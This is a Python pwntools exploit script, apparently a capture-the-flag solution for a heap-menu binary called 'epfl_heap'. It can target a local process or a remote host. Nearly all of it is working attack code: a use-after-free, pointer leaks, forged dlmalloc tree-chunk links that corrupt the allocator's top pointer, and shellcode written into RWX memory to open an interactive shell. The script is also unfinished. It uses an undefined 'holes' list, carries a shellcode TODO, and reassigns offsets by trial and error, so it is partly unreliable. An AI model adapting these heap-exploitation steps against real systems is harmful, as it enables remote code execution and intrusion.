#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("epfl_heap")

gs = """
set debuginfod enabled on
set max-visualize-chunk-size 0x100
# b do_malloc
"""


def start():
    if args.LOCAL:
        p = process(
            [e.path], env={"LD_PRELOAD": "./frida-gadget.so", "LD_LIBRARY_PATH": "./libs"})
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


def send_num(i: int, prefix=b">"):
    io.sendlineafter(prefix, str(i).encode())


def menu(i):
    send_num(i)


CURR_IDX = 0


def allocate(sz: int):
    global CURR_IDX
    curr_idx = CURR_IDX
    CURR_IDX += 1
    menu(1)
    send_num(sz)
    return curr_idx


def edit(i: int, data: bytes):
    menu(2)
    send_num(i)
    io.sendafter(b">", data)


def read(i: int):
    menu(3)
    send_num(i)
    io.recvuntil(b"chunk data: \n")
    return io.recvuntil(b"*EPFL* ~Heap Menu~", drop=True)


def delete(i: int):
    menu(4)
    send_num(i)


def set_username(name: bytes):
    menu(5)
    res = io.sendafter(b"your username?", name)
    print(res)


def pause():
    pass


io = start()

# set_username(b"C"*0x40)

# io.interactive()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

UAF_TARGET_SZ = 0x800

# Start              End                Size               Offset             Perm Path
# 0x00007fdbebe06000 0x00007fdbec63a000 0x0000000000834000 0x0000000000000000 rw- <tls-th1><stack-th2>
# Offset (from mapped):  0x7fdbebe06000 + 0x820298
# [ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
# Start              End                Size               Offset             Perm Path
# 0x00007fc72ce18000 0x00007fc72d64c000 0x0000000000834000 0x0000000000000000 rw- <tls-th1><stack-th2>
# Offset (from mapped):  0x7fc72ce18000 + 0x801e80

# gef> scan-section 0x00007fc72ce18000-0x00007fc72d64c000 epfl_heap
# [+] Searching for addresses in '0x00007fc72ce18000-0x00007fc72d64c000' that point to 'epfl_heap'
#  0x00007fc72d619e80  ->  0x000055e5851a0350 <print_username>  ->  0xe5894800005fb3e9
#  0x00007fc72d619e88  ->  0x000055e5851a0355 <print_username+0x5>  ->  0x4810ec8348e58948
#  0x00007fc72d619e90  ->  0x000055e5851a0355 <print_username+0x5>  ->  0x4810ec8348e58948
#  0x00007fc72d619ec8  ->  0x000055e5851a0350 <print_username>  ->  0xe5894800005fb3e9
#  0x00007fc72d619ed0  ->  0x000055e5851a0355 <print_username+0x5>  ->  0x4810ec8348e58948
#  0x00007fc72d619ed8  ->  0x000055e5851a0355 <print_username+0x5>  ->  0x4810ec8348e58948
#  0x00007fc72d61e2d0  ->  0x000055e58519f000  ->  0x00010102464c457f
#  0x00007fc72d622d40  ->  0x000055e5851a2d68 <__frame_dummy_init_array_entry>  ->  0x000055e5851a0280 <frame_dummy>  ->  0xffff77e9fa1e0ff3
#  0x00007fc72d622d60  ->  0x000055e5851a2d70 <__do_global_dtors_aux_fini_array_entry>  ->  0x000055e5851a0240 <__do_global_dtors_aux>  ->  0x2dfd3d80fa1e0ff3
#  0x00007fc72d622d70  ->  0x000055e5851a0280 <frame_dummy>  ->  0xffff77e9fa1e0ff3
#  0x00007fc72d622d90  ->  0x000055e5851a3048 <completed>  ->  0x0000000000000000
#  0x00007fc72d623440  ->  0x000055e5851a0289 <do_malloc>  ->  0xe5894800005d7ae9
#  0x00007fc72d6284e8  ->  0x000055e5851a0350 <print_username>  ->  0xe5894800005fb3e9
#  0x00007fc72d628d38  ->  0x000055e5851a0354 <print_username+0x4>  ->  0x10ec8348e5894800
#  0x00007fc72d62a148  ->  0x000055e5851a0354 <print_username+0x4>  ->  0x10ec8348e5894800
#  0x00007fc72d640640  ->  0x000055e5851a3030 <stdin@GLIBC_2.2.5>  ->  0x00007fc72fe96aa0 <_IO_2_1_stdin_>  ->  0x00000000fbad208b
#  0x00007fc72d6406c0  ->  0x000055e5851a0289 <do_malloc>  ->  0xe5894800005d7ae9
#  0x00007fc72d6408c0  ->  0x000055e5851a3014  ->  0x0000000000000000
#  0x00007fc72d646ca8  ->  0x000055e5851a0289 <do_malloc>  ->  0xe5894800005d7ae9
#  0x00007fc72d646cd8  ->  0x000055e5851a02a7 <do_free>  ->  0xe5894800005e5ce9
#  0x00007fc72d646d68  ->  0x000055e5851a031d <set_username>  ->  0xe5894800005ee6e9
#  0x00007fc72d646d98  ->  0x000055e5851a0350 <print_username>  ->  0xe5894800005fb3e9


CORR_TARGET_SZ = 0xb0

UAF_TARGET = allocate(UAF_TARGET_SZ)
another = allocate(UAF_TARGET_SZ)

leaks = read(UAF_TARGET)
print(hexdump(leaks))

some_ptr = u64(leaks[:8])
log.info("leaked some pointer: %#x", some_ptr)

good_ptr = u64(leaks[0x20:0x28])
log.info("good ptr: %#x", good_ptr)

region_base = good_ptr - 0x820298

log.success("region base: %#x", region_base)


pause()

FAKE_TARGET_SZ = 0x1000-0x100

FAKER = allocate(FAKE_TARGET_SZ)
reallocer = allocate(FAKE_TARGET_SZ)

leaks = read(FAKER)
print(hexdump(leaks))
# pause()
faker_ptr = u64(leaks[:8]) + 0x10  # +0x10 for the header
log.info("faker @ %#x", faker_ptr)
# for cleanlyness, reallocate it again s.t. we actually have it allocated correctly

pause()
reallocer2 = allocate(FAKE_TARGET_SZ - 1)

pie_on_heap = region_base + 0x801e80 - 0x20 + 0x10 - 0x20
# pie_on_heap = region_base + 0x82ed68 - 0x10
pie_on_heap = region_base + 0x82ed08 - 0x18
pie_on_heap = region_base + 0x812148 - 0x48

funny_ptr = region_base + 0x8201d8 + 0x40
# funny_ptr = region_base + 0x820010 + 0x8 # malloc state xd
funny_ptr = region_base + 0x820620 - 0x8
# pie_on_heap = funny_ptr
# pie_on_heap = some_ptr
# pie_on_heap = faker_ptr
# pie_on_heap = region_base - 0x1098038 # ptr to username contents?

# struct malloc_tree_chunk {
#   /* The first four fields must be compatible with malloc_chunk */
#   size_t                    prev_foot;
#   size_t                    head;
#   struct malloc_tree_chunk* fd;
#   struct malloc_tree_chunk* bk;

#   struct malloc_tree_chunk* child[2];
#   struct malloc_tree_chunk* parent;
#   bindex_t                  index;
# };

# fill holes
# holes = []
# for sz in range(0x0, 0xe0, 2):
#     holes.append(allocate(sz))

# for hole in holes:
#     delete(hole)

# create new hole

# HOLE_SZ = 0x900
# holeage = allocate(HOLE_SZ)
# delete(holeage)

# # now allocate, but smaller, for dv-size!
# allocate(HOLE_SZ - 0x130)

TREE_SZ = 0x400

tree_uaf = allocate(TREE_SZ)
reallocer3 = allocate(TREE_SZ)
#  now we have uaf on tree!

first_fake = faker_ptr
second_fake_off = 0x50
second_fake = faker_ptr + second_fake_off

edit(tree_uaf, fit({
    16: first_fake,  #  child[0]
    16 + 8: first_fake,  # child[1]
}))

rwx_ptr = region_base + 0x3090000  # + 0x10 + 0x200
if not args.LOCAL:
    rwx_ptr = region_base - 0x38000

shellcode_ptr = rwx_ptr + 0x1d0 - 0x10

mstate_top = region_base + 0x820038

FD = mstate_top
# FD = rwx_ptr
BK = shellcode_ptr
# BK = 0x4141414141414141

edit(FAKER, fit({
    0: {
        0: 0,
        8: (TREE_SZ - 0x10) | 1,
        # fd, bk??
        16: FD - 0x18,
        16 + 8: BK,
        32: 0,
        32 + 8: 0,  #  no children!
    }
}))

log.info("Now doing allocation")

# pause()

final = allocate(TREE_SZ - 0x20)

log.info("Corrupted top????")

# pause()

log.info("rwx @ %#x", rwx_ptr)
log.info("shellcode @ %#x", shellcode_ptr)
log.info("Doing final final allocation???")

for i in range(12):
    print(i)
    final_final = allocate(0x1000 - i - 1)
    edit(final_final, asm(shellcraft.sh()))  #  TODO: actual shellcode

funny_shit = (region_base + 0xffff) & (0xffffffff_ffff0000)
funny_shit |= (0x30eb)  # jmp +30 lmaoxd
lmaoxd = rwx_ptr + 0x19e

FD = mstate_top
FD = lmaoxd
# FD = 0x4242424242424242
BK = funny_shit
# BK = 0x4141414141414141

edit(FAKER, fit({
    0: {
        0: 0,
        8: (TREE_SZ - 0x10) | 1,
        # fd, bk??
        16: FD - 0x18,
        16 + 8: BK,
        32: 0,
        32 + 8: 0,  #  no children!
    }
}))

log.info("Now doing allocation again though!")

# pause()

final = allocate(TREE_SZ - 0x20)

log.info("Corrupted top????")

# io.interactive()

# exit(0)

pause()


for i in holes:
    delete(i)


pie_target = allocate(CORR_TARGET_SZ)
# cause UAF
lmao = allocate(CORR_TARGET_SZ)
# pause()
log.info("Corrupting it now!: %#x", pie_on_heap)
edit(pie_target, p64(pie_on_heap) + p64(pie_on_heap))
print("corrupted: ", pie_target)


# pause()

log.info("Trying to use it now!")
third = allocate(CORR_TARGET_SZ+1)

# pause()
log.info("Need one more?")
fourth = allocate(CORR_TARGET_SZ+2)


# log.info("doing read?")

# pie_leak = read(fourth)
# print(hexdump(pie_leak))

# log.info("Allocate one more time")

# fifth = allocate(0x1000 - 0x10)

io.interactive()
